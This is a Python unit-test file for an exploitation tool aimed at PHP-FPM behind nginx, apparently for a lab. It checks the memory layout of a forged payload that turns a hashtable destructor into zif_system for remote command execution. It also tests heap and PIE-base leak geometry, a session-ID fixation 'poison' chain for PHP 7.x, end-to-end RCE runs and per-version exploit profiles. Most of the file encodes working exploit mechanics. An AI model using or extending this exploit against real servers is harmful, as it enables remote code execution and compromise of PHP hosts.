#!/usr/bin/env python3
"""Unit tests for the nginx + PHP-FPM exploitation client (tools/php2shell_fpm.py).

The unit tests need no laboratory.  The integration tests at the bottom
need the local FPM lab (lab/fpm, ``tools/php2shell_fpm_labs.py up``) and
run only when PHP2SHELL_FPM_LAB=1 is set.
"""

from __future__ import annotations

import json
import os
import struct
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

import php2shell_fpm as fpm  # noqa: E402
import php2shell_fpm_profile as profile_gen  # noqa: E402
import php2shell_fpm_versions as versions  # noqa: E402

D = 0x7F07BE280000      # lab-observed stale struct address
K = 0xFE8               # lab-observed reclaim content offset
SIZE = 12288
ZIF = 0x556C90186660    # lab-observed zif_system absolute address
CMD = b"id>out/p1"


class MultipartTests(unittest.TestCase):
    def test_build_multipart_shape(self):
        parts = [
            {"name": "pad0", "data": b"C" * 16},
            {"name": "f", "filename": "a.txt", "data": b"x" * 4},
        ]
        body = fpm.build_multipart(parts, b"BOUND1")
        self.assertTrue(body.startswith(b"--BOUND1\r\n"))
        self.assertIn(b'name="pad0"', body)
        self.assertIn(b'filename="a.txt"', body)
        self.assertIn(b"Content-Type: application/octet-stream", body)
        self.assertTrue(body.endswith(b"--BOUND1--\r\n"))


class LeakTests(unittest.TestCase):
    def test_dechunk(self):
        self.assertEqual(fpm._dechunk(b"4\r\nABCD\r\n0\r\n\r\n"), b"ABCD")
        self.assertEqual(fpm._dechunk(b"plain"), b"plain")

    def test_leak_geometry(self):
        g = fpm._leak_geometry("8.4.26")
        self.assertIsNotNone(g)
        self.assertEqual(g["pads"], [32768, 16384])
        self.assertEqual(g["read_len"], 0x15810)
        self.assertEqual(g["chunk_ptr_off"], 0x77F8)
        self.assertEqual(g["pie_ptr_off"], 0x157E8)

    def test_leak_geometry_8425_pie_offset(self):
        g = fpm._leak_geometry("8.4.25")
        self.assertIsNotNone(g)
        self.assertEqual(g["pie_base_off"], 0x4E9FC7)
        self.assertEqual(g["pads"], [32768, 16384])


class NoOracleRemoteModeTests(unittest.TestCase):
    """--no-oracle must not silently read local /proc when remote."""

    def _args(self, **extra):
        base = dict(
            base="http://127.0.0.1:1",
            builder="http://127.0.0.1:2",
            version="8.4.26",
            chunk=0,
            pie=0,
            allow_local_fallback=False,
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_http_leak_failure_does_not_use_local_fallback(self):
        with mock.patch.object(fpm, "leak_bases_http",
                               side_effect=RuntimeError("offline")), \
             mock.patch.object(fpm, "_local_bases") as local:
            self.assertEqual(fpm.cmd_no_oracle(self._args()), 1)
            local.assert_not_called()

    def test_local_fallback_requires_explicit_opt_in(self):
        with mock.patch.object(fpm, "leak_bases_http",
                               side_effect=RuntimeError("offline")), \
             mock.patch.object(fpm, "_local_bases",
                               side_effect=RuntimeError("no lab")) as local:
            self.assertEqual(
                fpm.cmd_no_oracle(self._args(allow_local_fallback=True)), 1)
            local.assert_called_once_with("8.4.26")


class EndgamePayloadTests(unittest.TestCase):
    """The forged buffer must encode the exact dtor-chain layout the
    8.4.26 source expects (var_unserializer.re, session.c, zend_hash.c)."""

    @classmethod
    def setUpClass(cls):
        cls.buf = fpm._build_endgame_payload(D, K, SIZE, ZIF, CMD)

    def _off(self, addr: int) -> int:
        return K + (addr - D)

    def _u64(self, addr: int) -> int:
        return struct.unpack_from("<Q", self.buf, self._off(addr))[0]

    def _u32(self, addr: int) -> int:
        return struct.unpack_from("<I", self.buf, self._off(addr))[0]

    def _i64(self, addr: int) -> int:
        return struct.unpack_from("<q", self.buf, self._off(addr))[0]

    def test_fits_reclaim_buffer(self):
        self.assertLessEqual(K + 0x900, SIZE)

    def test_decode_struct(self):
        # last points at the embedded entries; used_slots=2 pushes new
        # values to data[2..] leaving data[1] for R:2 (var_access(1))
        self.assertEqual(self._u64(D + 0), D + 56)
        self.assertEqual(self._u64(D + 8), D + 0x400)
        self.assertEqual(self._u64(D + 16), D + 0x400)
        self.assertEqual(self._i64(D + 48), 64)
        self.assertEqual(self._i64(D + 56), 2)
        self.assertEqual(self._u64(D + 80), D + 0x300)
        self.assertEqual(self._i64(D + 0x400), 0)

    def test_fake_zval_is_reference(self):
        self.assertEqual(self._u64(D + 0x300), D + 0x500)
        self.assertEqual(self._u32(D + 0x308), 0x10A)  # IS_REFERENCE_EX

    def test_fake_reference(self):
        self.assertEqual(self._u32(D + 0x500), 0)      # rc forged 0
        self.assertEqual(self._u32(D + 0x504), 10)     # IS_REFERENCE
        self.assertEqual(self._u64(D + 0x508), D + 0x700)
        self.assertEqual(self._u32(D + 0x510), 0x307)  # IS_ARRAY_EX
        self.assertEqual(self._u64(D + 0x518), 0)      # sources = NULL

    def test_fake_hashtable(self):
        self.assertEqual(self._u32(D + 0x700), 1)      # rc 1
        self.assertEqual(self._u32(D + 0x704), 7)      # IS_ARRAY
        self.assertEqual(self._u32(D + 0x708), 0x10)   # HASH_FLAG_STATIC_KEYS
        self.assertEqual(self._u32(D + 0x70C), 0xFFFFFFF8)
        self.assertEqual(self._u64(D + 0x710), D + 0x800)
        self.assertEqual(self._u32(D + 0x718), 1)      # nNumUsed
        self.assertEqual(self._u32(D + 0x71C), 1)      # nNumOfElements
        self.assertEqual(self._u32(D + 0x720), 8)      # nTableSize
        self.assertEqual(self._u64(D + 0x730), ZIF)    # pDestructor

    def test_execute_frame(self):
        # the bucket at E doubles as the zif_system execute_data frame
        self.assertEqual(self._u64(D + 0x800), D + 0x880)  # val.str / opline
        self.assertEqual(self._u32(D + 0x808), 6)          # IS_STRING (non-UNDEF)
        self.assertEqual(self._u64(D + 0x810), D + 0x8F0)  # return_value scratch
        self.assertEqual(struct.unpack_from("<H", self.buf, self._off(D + 0x82C))[0], 1)
        self.assertEqual(self._u64(D + 0x850), D + 0x880)  # arg1.str
        self.assertEqual(self._u32(D + 0x858), 0x106)      # arg1 IS_STRING_EX

    def test_fake_zend_string(self):
        self.assertEqual(self._u32(D + 0x880), 1)          # gc.refcount
        self.assertEqual(self._u32(D + 0x884), 6)          # IS_STRING
        self.assertEqual(self._u64(D + 0x890), len(CMD))
        val = self.buf[self._off(D + 0x898):self._off(D + 0x898) + len(CMD)]
        self.assertEqual(val, CMD)
        self.assertEqual(self.buf[self._off(D + 0x898) + len(CMD)], 0)


class ProfileGeneratorTests(unittest.TestCase):
    NM = ("0000000000386460 t zif_system\n"
          "0000000000549890 T zval_ptr_dtor\n"
          "0000000000a04660 B basic_globals\n")

    def test_parse_nm_symbols(self):
        symbols = profile_gen.parse_nm(self.NM)
        self.assertEqual(symbols, {
            "zif_system": 0x386460,
            "zval_ptr_dtor": 0x549890,
            "basic_globals": 0xA04660,
        })

    def test_parse_nm_rejects_missing_symbol(self):
        with self.assertRaisesRegex(ValueError, "missing symbols"):
            profile_gen.parse_nm("0000000000386460 t zif_system\n")

    def test_build_draft_copies_geometry_and_marks_unverified(self):
        template = json.loads(
            (ROOT / "profiles" / "8.4.26-fpm.json").read_text())
        draft = profile_gen.build_draft("8.4.25",
                                        profile_gen.parse_nm(self.NM), template)
        self.assertFalse(draft["verified"])
        self.assertFalse(draft["rce"])
        self.assertEqual(draft["fixed_in"], "8.4.27")
        self.assertEqual(draft["libphp"]["zif_system"], "0x386460")
        self.assertEqual(draft["fpm"]["basic_globals"], "0xa04660")
        self.assertEqual(draft["fpm"]["leak"], template["fpm"]["leak"])


class PathConfigTests(unittest.TestCase):
    def test_cookie_name_and_custom_paths(self):
        args = SimpleNamespace(app_path="/index.php", arm_path="/arm.php",
                               ref_path="/session.php", probe_path="/404",
                               session_cookie="MYSESSID")
        with mock.patch.dict(fpm.PATHS, {
                "app": "/app.php", "arm": "/bigvar.php", "ref": "/ref.php",
                "probe": "/nope.php", "cookie": "PHPSESSID"}):
            fpm.configure_paths(args)
            self.assertEqual(fpm.PATHS["app"], "/index.php")
            self.assertEqual(fpm.PATHS["cookie"], "MYSESSID")
            self.assertEqual(fpm._cookie(b"abc"), b"MYSESSID=abc")


class OracleChunkTests(unittest.TestCase):
    def test_chunk_base_handles_merged_anonymous_mapping(self):
        oracle = object.__new__(fpm.Oracle)
        oracle.maps = [(0x7F0000000000, 0x7F0000230000, "rw-p")]
        self.assertEqual(oracle.chunk_base(0x7F0000081000), 0x7F0000000000)


class ProfileConsistencyTests(unittest.TestCase):
    def _profile(self, version: str = "8.4.26") -> dict:
        return json.loads((ROOT / "profiles" / f"{version}-fpm.json").read_text())

    def test_fpm_profile_matches_module_constants(self):
        meta = self._profile()["fpm"]
        self.assertEqual(meta["bg_unserialize_data_off"],
                         fpm.BG_UNSERIALIZE_DATA_OFF)
        self.assertEqual(meta["bg_unserialize_level_off"],
                         fpm.BG_UNSERIALIZE_LEVEL_OFF)
        self.assertEqual(meta["struct_size"], 8216)
        self.assertEqual(meta["reclaim_size"], SIZE)
        self.assertEqual(meta["reclaim_pads"], [4096, 4096])

    def test_fpm_profile_is_rce_verified(self):
        profile = self._profile()
        self.assertEqual(profile["sapi"], "fpm")
        self.assertTrue(profile["rce"])
        self.assertTrue(profile["verified"])
        self.assertEqual(profile["fixed_in"], "8.4.27")
        self.assertEqual(profile["libphp"]["zif_system"], "0x386660")

    def test_fpm_8425_profile_is_rce_verified(self):
        profile = self._profile("8.4.25")
        self.assertTrue(profile["rce"])
        self.assertTrue(profile["verified"])
        self.assertEqual(profile["fixed_in"], "8.4.27")
        self.assertEqual(profile["libphp"]["zif_system"], "0x386460")
        self.assertEqual(profile["fpm"]["reclaim_pads"], [4096, 4096])
        self.assertEqual(profile["fpm"]["no_oracle"]["candidates"],
                         [{"d_off": "0x7f000", "k": "0xfe8"}])

    def test_fpm_profile_validates_against_schema(self):
        try:
            import jsonschema
        except ImportError:
            self.skipTest("jsonschema not installed")
        schema = json.loads((ROOT / "profiles" / "fpm-schema.json").read_text())
        for version in ("8.2.34", "8.3.35", "8.4.0", "8.4.25", "8.4.26"):
            with self.subTest(version=version):
                jsonschema.validate(self._profile(version), schema)


LAB = os.environ.get("PHP2SHELL_FPM_LAB") == "1"
LAB_VERSION = os.environ.get("PHP2SHELL_FPM_VERSION", "8.4.26")
LAB_PORTS = {"8.4.25": (8130, 8131), "8.4.26": (8110, 8111)}


@unittest.skipUnless(LAB, "set PHP2SHELL_FPM_LAB=1 with the FPM lab up")
class FpmLabIntegrationTests(unittest.TestCase):
    """End-to-end primitive and RCE against a local FPM lab."""

    def _args(self, **extra):
        chain, builder = LAB_PORTS[LAB_VERSION]
        proof = f"out/p1lab-{LAB_VERSION.replace('.', '')}"
        base = dict(
            base=f"http://127.0.0.1:{chain}",
            builder=f"http://127.0.0.1:{builder}",
            version=LAB_VERSION,
            size=4 << 20,
            value=1337337,
            command=f"id>{proof}",
            proof_file=proof,
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_primitive_observable(self):
        self.assertEqual(fpm.cmd_primitive(self._args()), 0)

    def test_endgame_rce_proof(self):
        self.assertEqual(fpm.cmd_endgame(self._args()), 0)

    def test_no_oracle_rce_proof(self):
        self.assertEqual(fpm.cmd_no_oracle(self._args()), 0)


class VersionRegistryTests(unittest.TestCase):
    """The advisory matrix (CVE-2026-109619) has to drive every tool."""

    def test_patched_branch_boundary(self):
        self.assertTrue(versions.is_vulnerable("8.4.26"))
        self.assertFalse(versions.is_vulnerable("8.4.27"))
        self.assertTrue(versions.is_vulnerable("8.2.34"))
        self.assertFalse(versions.is_vulnerable("8.2.35"))
        self.assertTrue(versions.is_vulnerable("8.3.35"))
        self.assertFalse(versions.is_vulnerable("8.3.36"))

    def test_eol_branches_are_always_vulnerable(self):
        for version in ("7.2.34", "7.4.33", "8.0.30", "8.1.33"):
            with self.subTest(version=version):
                self.assertTrue(versions.is_vulnerable(version))
                self.assertIsNone(versions.fixed_in(version))

    def test_chain_requires_php_eight(self):
        """PHP <= 7.x never frees the unserialize struct on the bailout."""
        self.assertFalse(versions.chain_applies("7.2.34"))
        self.assertFalse(versions.chain_applies("7.4.33"))
        self.assertTrue(versions.chain_applies("8.0.0"))
        self.assertTrue(versions.chain_applies("8.4.26"))

    def test_cancel_decode_detection_reads_the_source(self):
        source = ROOT / "lab" / "fpm" / "runtime" / "src"
        expected = {"php-7.2.34": False, "php-7.4.33": False,
                    "php-8.2.34": True, "php-8.4.26": True}
        for name, want in expected.items():
            tree = source / name
            if not tree.is_dir():
                self.skipTest(f"{tree} is not extracted")
            with self.subTest(build=name):
                self.assertEqual(versions.has_session_cancel_decode(str(tree)),
                                 want)

    def test_fixed_in_per_branch(self):
        self.assertEqual(versions.fixed_in("8.4.26"), "8.4.27")
        self.assertEqual(versions.fixed_in("8.3.1"), "8.3.36")
        self.assertIsNone(versions.fixed_in("7.2.1"))

    def test_affected_versions_cover_every_branch(self):
        affected = versions.affected_versions()
        for version in ("8.2.34", "8.3.35", "8.4.26", "7.2.34", "7.4.33"):
            self.assertIn(version, affected)

    def test_ports_keep_documented_builds_and_never_collide(self):
        self.assertEqual(versions.ports_for("8.4.26"), (8110, 8111, 9001, 9002))
        self.assertEqual(versions.ports_for("8.4.25"), (8130, 8131, 9021, 9022))
        used: dict[int, str] = {}
        for version in ("7.2.34", "7.4.33", "8.2.34", "8.3.35",
                        "8.4.25", "8.4.26", "8.4.27"):
            for port in versions.ports_for(version):
                self.assertNotIn(port, used, f"{version} reuses {port} "
                                             f"from {used.get(port)}")
                used[port] = version

    def test_unknown_branch_is_rejected(self):
        with self.assertRaises(versions.UnknownVersion):
            versions.ports_for("9.9.9")

    def test_source_detection_uses_the_fix_marker(self):
        source = ROOT / "lab" / "fpm" / "runtime" / "src"
        fixed = source / "php-8.4.27.tar.gz"
        vulnerable = source / "php-8.4.26.tar.gz"
        if not (fixed.is_file() and vulnerable.is_file()):
            self.skipTest("release tarballs are not downloaded")
        self.assertTrue(versions.source_is_fixed(str(fixed)))
        self.assertFalse(versions.source_is_fixed(str(vulnerable)))


MODERN_SOURCE = """\
#define VAR_ENTRIES_MAX 1018
struct php_unserialize_data {
\tvar_entries      *last;
\tvar_dtor_entries *first_dtor;
\tvar_dtor_entries *last_dtor;
\tHashTable        *allowed_classes;
\tHashTable        *ref_props;
\tzend_long         cur_depth;
\tzend_long         max_depth;
\tvar_entries       entries;
};
"""


class UnserializeLayoutTests(unittest.TestCase):
    """The struct shape decides which payload has to be forged."""

    def _parse(self, text: str) -> dict:
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "ext", "standard")
            os.makedirs(path)
            with open(os.path.join(path, "var_unserializer.c"),
                      "w", encoding="utf-8") as handle:
                handle.write(text)
            return profile_gen.parse_unserialize_struct(tmp)

    def test_modern_shape_has_embedded_block(self):
        parsed = self._parse(MODERN_SOURCE)
        self.assertEqual(parsed["offsets"]["entries"], 56)
        self.assertEqual(parsed["size"], 56 + 16 + 8 * 1018)
        self.assertEqual(parsed["var_entries"]["data"], 16)
        self.assertEqual(parsed["var_entries"]["used_slots"], 0)


class PoisonTests(unittest.TestCase):
    """Upload-progress session-ID fixation (the chain that works on 7.x)."""

    def _args(self, **extra):
        base = dict(base="http://127.0.0.1:1", builder="http://127.0.0.1:2",
                    version="7.4.33", sid="fixedsid01", payload="MARKER",
                    progress_key=None)
        base.update(extra)
        return SimpleNamespace(**base)

    def test_sid_comes_from_the_post_body_and_payload_is_the_filename(self):
        captured = {}

        def fake_post(parts, boundary, timeout=None):
            captured["parts"] = parts
            return 200, {}, b""

        with mock.patch.object(fpm, "Target") as target_cls, \
             mock.patch.object(os.path, "isfile", return_value=False), \
             mock.patch.object(fpm.os.path, "isfile", return_value=False):
            target_cls.side_effect = lambda *a, **k: mock.Mock(
                post_multipart=fake_post, get=lambda *a, **k: (200, {}, b""))
            self.assertEqual(fpm.cmd_poison(self._args()), 1)

        names = [part["name"] for part in captured["parts"]]
        self.assertIn("PHPSESSID", names)          # POST-body sid fixation
        self.assertIn("PHP_SESSION_UPLOAD_PROGRESS", names)
        file_part = next(p for p in captured["parts"]
                         if p.get("filename") is not None)
        self.assertEqual(file_part["filename"], b"MARKER")

    def test_verified_when_the_application_reflects_the_payload(self):
        def post(*_args, **_kwargs):
            return 200, {}, b""

        def get(*_args, **_kwargs):
            return 200, {}, b"upload_progress_pwn|a:1:{s:4:\"name\";s:6:\"MARKER\";}"

        with mock.patch.object(fpm, "Target") as target_cls, \
             mock.patch.object(fpm.os.path, "isfile", return_value=False):
            target_cls.side_effect = lambda *a, **k: mock.Mock(
                post_multipart=post, get=get)
            self.assertEqual(fpm.cmd_poison(self._args()), 0)

if __name__ == "__main__":
    unittest.main()


class PieCodeWindowTests(unittest.TestCase):
    """The executable window bounds the PIE-base search: the real pointer is
    tried at the step that reproduces its offset, and every pointer costs at
    most a handful of endgame attempts."""

    WINDOW = (0x200000, 0x600000)

    def _steps(self, pointer: int) -> list[tuple[int, int]]:
        """(step, offset) pairs the window would actually try."""
        aligned = pointer & ~(fpm.MEM_CHUNK - 1)
        out = []
        for steps in range(0, 6):
            candidate = aligned - steps * fpm.MEM_CHUNK
            offset = pointer - candidate
            if offset >= self.WINDOW[1]:
                break
            if offset < self.WINDOW[0]:
                continue
            out.append((steps, offset))
        return out

    def test_real_handler_pointer_is_tried_at_its_true_base(self):
        pie = 0x557099000000            # lab-observed 8.4.26 base
        pointer = pie + 0x4EA787        # execute_ex handler table
        tried = self._steps(pointer)
        self.assertIn((2, 0x4EA787), tried)
        # the step that carries the true base is among the candidates
        self.assertTrue(any(pointer - (pointer & ~(fpm.MEM_CHUNK - 1))
                            + step * fpm.MEM_CHUNK == 0x4EA787
                            for step, _offset in tried))

    def test_search_is_bounded_per_pointer(self):
        for pointer in (0x5570994EA787, 0x560EECEB6E20, 0x7F784BC8B000):
            with self.subTest(pointer=hex(pointer)):
                self.assertLessEqual(len(self._steps(pointer)), 4)

    def test_window_constant_matches_the_shipped_geometry(self):
        self.assertEqual(fpm.PIE_CODE_WINDOW, self.WINDOW)
